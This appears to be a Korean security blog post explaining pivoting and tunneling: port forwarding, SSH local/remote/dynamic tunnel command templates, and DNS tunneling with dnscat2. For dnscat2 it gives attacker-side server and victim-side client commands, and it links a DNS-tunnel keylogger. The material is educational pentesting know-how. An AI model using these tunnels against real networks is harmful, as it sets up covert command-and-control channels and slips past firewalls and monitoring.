---
layout: post
title: 터널링(Tunneling)
subtitle: Pivoting, Tunneling, SSH Tunneling
categories: SYSTEM
tags: [SSH, ICMP, Pivoting, Tunneling, Pentesting, Lateral Movement]
---

# 터널링(Tunneling)
<span style="color: red; font-weight: bold;">Pivoting</span>은 <u>한 시스템을 발판으로 삼아 다른 시스템으로 이동하는 기법</u>이다. <br>
이러한 Pivoting을 수행하기 위한 대표적인 기법으로 <span style="color: red; font-weight: bold;">터널링(Tunneling)</span>이 있다. 오늘은 Tunneling에 대해 알아보고자 한다. 터널링은 실제로 보내고자 하는 트래픽을 다른 트래픽 or 프로토콜로 **캡슐화**하여 전송하는 기법이다.


#### 💡 포트포워딩(Port Forwarding)
터널링을 알아보기 전 같이 혼동하기 쉬운 개념인 <span style="color: blue;">포트포워딩(Port Forwarding)</span>에 대해 알아보자. 용어는 확실하게 정리해두는 편이 좋다.😊<br> 

포트포워딩은 <u>특정 포트의 트래픽을 지정된 서비스 or 시스템으로 전달</u>해주는 것을 의미한다. <br>
한 번이라도 사설 IP 대역 내에서 웹 서비스를 띄워봤다면 금방 이해할 수 있을 것이다. 사설망(내부)에 있는 웹 서비스는 외부에서 바로 접근할 수 없기 때문에, 외부에서 해당 서비스로 접속하기 위해선 공인 IP(외부 IP)를 가진 공유기에서 **포트포워딩**을 설정해줘야 한다.

예를 들어, 외부에서 공인IP:7777로 요청이 들어오면 이를 내부의 사설 IP:443으로 전달하는 규칙을 설정해 주는 것이 포트포워딩이다.(공인IP:7777 → 사설IP:443) <br>

이와 다르게 터널링은 단순히 트래픽을 전달하는 게 아니라 <u>특정 프로토콜(ex. SSH)로 감싸서 전달하는 기법</u>이다. 이렇게 하면 네트워크 제한이나 방화벽 등의 제약을 우회할 수 있다.


<br>


### 터널링(Tunneling) 기법(SSH & DNS Tunneling)
많이 사용되는 **SSH 프로토콜**과 **DNS 프로토콜**의 터널링 기법에 대해 알아보자.

#### 1. SSH Tunneling
먼저 SSH Tunneling이다. SSH(Secure Shell) 프로토콜은 서버에 접속하기 위해 널리 사용되는 프로토콜이다. <br>
SSH Tunneling은 간단하다. 명령어만 잘 숙지하고 있으면 언제든지 활용할 수 있다.

SSH Tunneling은 아래와 같이 3가지로 분류해볼 수 있다. <br>
- <span style="color: red; font-weight: bold;">L</span>**ocal SSH Tunneling**: 로컬의 특정 포트로 들어오는 트래픽을 원격 호스트:포트로 전달 <br>
```
ssh -L (로컬IP):[로컬port]:[원격지IP]:[원격지port] [원격지 SSH 아이디]@[원격지IP]
```
- <span style="color: red; font-weight: bold;">R</span>**emote SSH Tunneling**: 원격지의 특정 포트로 들어오은 트래픽을 로컬(출발지)에게 전달 <br>
```
ssh -R [원격지포트]:[로컬IP]:[로컬port] [원격지 SSH 아이디]@[원격지IP]
```
- <span style="color: red; font-weight: bold;">D</span>**ynamic SSH Tunneling**: 로컬에서 보내는 트래픽을 다양한 목적지로 전달 <br>
```
ssh -D [로컬IP]:[로컬port] [원격지 SSH 아이디]@[원격지IP]
```

Dynmaic SSH Tunneling은 위의 Local, Remote와 다르게 1:N 연결을 수행한다고 볼 수 있다. 1:N 연결의 특성답게 다른 시스템을 스캔(ex. nmap)하는데 사용하기 좋다. 이를 위해선 **proxychains**를 설치해야한다.

proxychains는 다음에 실습을 통해 알아보자... 아래의 링크를 통해 proxychains를 다운로드 받을 수 있다. <br>
👉 [Github proxychains](https://github.com/haad/proxychains)

<br>

#### 2. DNS Tunneling
인터넷 환경 뿐만 아니라 내부망에서도 DNS를 자체 구축하여 사용할 정도로 필수적으로 사용되므로 DNS 쿼리 자체를 막는 경우는 거의 없다. DNS Tunneling 기법은 실제로도 악성코드의 명령 및 제어(C2) 통신 등에 자주 활용된다.

DNS Tunneling은 보내고자 하는 패킷을 DNS 패킷에 담아 전달하는 기법이다. [dnscat2](https://github.com/iagox86/dnscat2)라는 오픈소스를 활용하여 쉽게 DNS Tunneling을 구현할 수 있다. <br>
DNS Tunneling은 공격자가 DNS Server 역할을 수행하고, 피해자가 DNS Client가 된다.
- 공격자(root 실행 권장)
```
ruby ./dnscat2.rb [도메인 ex. k-co-co.github.io]
```
- 피해자
```
./dnscat2 [도메인 ex. k-co-co.github.io]
./dnscat2 --dns server=[공격자IP],port=53
```

<br>

찾아보니 DNS Tunneling을 활용한 [키로거(DNS Tunnel Keylogger)](https://github.com/Geeoon/DNS-Tunnel-Keylogger)도 있다. 

끝.


<br><br>

### ✅ 참고
<a href="https://core-research-team.github.io/2020-05-01/DNS-Tunneling">DNS Tunneling</a><br>
<a href="https://www.unixtutorial.org/ssh-port-forwarding/?utm_source=chatgpt.com">SSH Tunneling</a><br>
<a href="https://www.xn--hy1b43d247a.com/lateral-movement/dynamic-port-fowarding">Dynamic SSH Tunneling</a><br>